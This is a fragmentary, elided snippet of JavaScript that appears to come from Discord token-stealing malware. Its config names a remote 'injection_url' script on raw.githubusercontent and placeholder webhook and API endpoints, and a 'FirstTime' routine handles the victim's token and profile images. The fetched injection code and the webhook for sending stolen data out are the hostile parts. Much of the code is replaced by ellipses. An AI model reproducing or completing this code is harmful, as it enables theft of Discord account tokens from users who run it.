...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Re-Edit/api-creal/main/inj.js",
    webhook: "%WEBHOOK%",
    Placed: "%API_URL%",
    Filter: {
        "urls": [
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Re-Edit/papa/main/scr.jpg"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Re-Edit/papa/main/banner.gif"
